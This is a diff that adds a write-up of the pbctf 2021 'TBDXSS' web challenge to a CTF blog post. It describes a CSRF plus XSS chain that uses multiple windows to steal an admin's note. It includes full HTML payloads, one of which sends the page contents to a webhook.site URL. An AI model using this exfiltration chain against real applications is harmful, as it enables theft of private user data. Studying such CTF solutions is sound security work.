@@ -4,6 +4,57 @@
 
 Last week [we](https://ctftime.org/team/130817) played [pbctf 2021](https://ctftime.org/event/1371) and had fun solving those hard challenges. Web challenges were enjoyable😋 meanwhile difficult🤕.
 
+## TBDXSS
+
+> 29 solves
+> Author: Jazzy
+> Description: The TBD in the challenge name stands for ....
+
+Just a normal note app we can change our note by sending a POST request to `/change_note` then view it in `/note`
+`/note` in admin account contains the flag and also vulnerable to XSS, the goal is to get the note by using using a CSRF bug inside `/change_note` to get `/note` but the problem is if we change the note to an xss payload we will lost the flag, so we need to have a copy of `/note` then after we change the note to our xss payload we can steal `/note` 
+
+There is a trick that we can use multiple iframes poiniting to `/note` then with `top.frames[0]` get the content but the page had XFO set to deny, we need to use `window.open()` Headless chrome support open() by default no need for user interaction.
+
+- first window embeds a loading image to hang the browser and opens the second window
+- second window opens the third window and redirect itslef to /note 
+- third window will open a new window to submit the csrf form and the forth window pointing to /note which our xss will trigger
+- forth window will use opener.opener to access /note that contains the flag of admin and send it using a webhook
+
+first:
+```html
+<img src=https://httpstat.us/200?sleep=9000>
+
+<script>
+
+window.open('mydomain/second.html','tr')
+
+</script>
+```
+second:
+```html
+
+<script>
+
+window.open('mydomain/third.html','j')
+
+setTimeout(function(){location='https://tbdxss.chal.perfect.blue/note?2'},500)
+</script>
+```
+third:
+```html
+<form id=jj method=post target=s action=https://tbdxss.chal.perfect.blue/change_note>
+<input name=data value="xss<img src=x onerror=&quot;setTimeout(function(){fetch('https://webhook.site/ffc75ac7-840b-41bd-b6c3-890343307ea0?x='+btoa(opener.opener.document.body.innerHTML))},1000)&quot;><img src=https://httpstat.us/200?sleep=9000>">
+</form>
+<img src=x onerror="
+let s=window.open('https://tbdxss.chal.perfect.blue/note','s')
+
+setTimeout(function(){jj.submit()},600)
+fetch('https://webhook.site/ffc75ac7-840b-41bd-b6c3-890343307ea0?start=start')
+setTimeout(function(){let x= window.open('https://tbdxss.chal.perfect.blue/note','x')},1000)
+
+">
+```
+
 ## Advancement
 
 > 9 solves
